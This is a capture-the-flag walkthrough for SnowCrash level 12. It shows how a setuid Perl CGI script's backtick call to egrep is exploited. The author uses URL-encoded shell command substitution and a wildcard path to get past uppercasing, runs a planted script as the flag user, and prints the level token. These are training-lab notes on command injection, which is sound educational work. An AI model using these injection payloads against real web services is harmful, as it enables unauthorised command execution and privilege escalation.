# Level12

## Walkthrough

We list the files in the home directory.

```bash
level12@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
-r-x------  1 level12 level12  675 Apr  3  2012 .profile
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
level12@SnowCrash:~$ file level12.pl 
level12.pl: setuid setgid a perl script, ASCII text executable
```

`level12` is a Perl script owned by `flag12` and has the setuid flag.

We display the content of the script.

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
    ($f, $s) = split(/:/, $line);
    if($s =~ $nn) {
      return 1;
    }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
    print("..");
  } else {
    print(".");
  }    
}

n(t(param("x"), param("y")));
```

From the first 2 lines, it seems the script is probably a HTTP server running on port 4646.

```bash
level12@SnowCrash:~$ netstat -tulpn | grep LISTEN
(No info could be read for "-p": geteuid()=2012 but you should be root.)
tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::4646                 :::*                    LISTEN      -               
tcp6       0      0 :::4747                 :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::4242                 :::*                    LISTEN      -   
```

The last lines of the script inform us that the server accepts 2 query parameters : `x` and `y`. Then, it calls a subroutine to perform some string manipulations, but only returns `1` or `0` and prints either `.` or `..`.

With our experience acquired from past levels, we can guess that the sole line of instructions which seems to be exploitable is the one calling the `egrep` command. Like previous levels, we might use command substitution to run the `getflag` command, because the backticks in Perl act like a `system` call which returns the output printed on stdout.  
The `$xx` variable refers to the `x` query parameter.

```bash
level12@SnowCrash:~$ curl localhost:4646?x=$(getflag)
curl: (6) Couldn't resolve host 'flag.Here'
curl: (6) Couldn't resolve host 'is'
curl: (6) Couldn't resolve host 'your'
curl: (6) Couldn't resolve host 'token'
curl: (6) Couldn't resolve host ''
curl: (6) Couldn't resolve host 'Nope'
curl: (6) Couldn't resolve host 'there'
curl: (6) Couldn't resolve host 'is'
curl: (6) Couldn't resolve host 'no'
curl: (6) Couldn't resolve host 'token'
curl: (6) Couldn't resolve host 'here'
curl: (6) Couldn't resolve host 'for'
curl: (6) Couldn't resolve host 'you'
curl: (6) Couldn't resolve host 'sorry.'
curl: (6) Couldn't resolve host 'Try'
curl: (6) Couldn't resolve host 'again'
curl: (6) Couldn't resolve host ''
..level12@SnowCrash:~$ curl localhost:4646?x="$(getflag)"
curl: (3) Illegal characters found in URL
```

If we pass `$(getflag)`, the command substitution happens in the current context.  
The first argument in the `egrep` command is enclosed into double quotes, so we don't need to write them ourselves but if we don't the command will be run instantly as previously seen. One solution is to encode these special characters to prevent the shell from interpreting the command.

```bash
# $(getflag)
level12@SnowCrash:~$ curl localhost:4646?x=%24%28getflag%29
..level12@SnowCrash:~$
```

Nothing happens, probably because all the text printed on stdout is stored in the `@output` variable. The solution might be to store the output of our command in a temporary file.

```bash
# $(getflag > /tmp/token)
level12@SnowCrash:~$ curl localhost:4646?x=%22%24%28getflag%29%20%3E%20%2Ftmp%2Ftoken%22
.level12@SnowCrash:~$ cat /tmp/token
cat: /tmp/token: No such file or directory
```

We analyze the code to check if we missed something. Indeed, before calling `egrep` the script replaces all lowercase characters by an uppercase, and trims all space characters at the start of the string.  
This means that our argument `%22%24%28getflag%29%20%3E%20%2Ftmp%2Ftoken%22` is transformed to `%22%24%28GETFLAG%29%20%3E%20%2FTMP%2FTOKEN%22`.

We cannot store the command inside an environment variable because it will only belong to user `level13`.  
Using a file to store our command is another option, but because of the uppercase replacement, we cannot create one in `/tmp` and pass it to `x` as it will be looking for `/TMP/...`.  

We know that a special character `*` exists in shell to match any character.

```bash
level12@SnowCrash:~$ mkdir /tmp/LEVEL12
level12@SnowCrash:~$ vim /tmp/LEVEL12/SCRIPT
level12@SnowCrash:~$ cat /tmp/LEVEL12/SCRIPT
#!/bin/sh

getflag > /tmp/LEVEL12/TOKEN
level12@SnowCrash:~$ chmod +x /tmp/LEVEL12/SCRIPT
level12@SnowCrash:~$ curl localhost:4646?x=%24%28%2F%2A%2FLEVEL12%2FSCRIPT%29
..level12@SnowCrash:~$ ^C
level12@SnowCrash:~$ cat /tmp/LEVEL12/TOKEN
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

## Resources

- [What's the difference between Perl's backticks, system, and exec?](https://stackoverflow.com/questions/799968/whats-the-difference-between-perls-backticks-system-and-exec)
- [Special characters like @ and & in cURL POST data](https://stackoverflow.com/questions/10060093/special-characters-like-and-in-curl-post-data)
- [URL encoder](https://www.urlencoder.org)
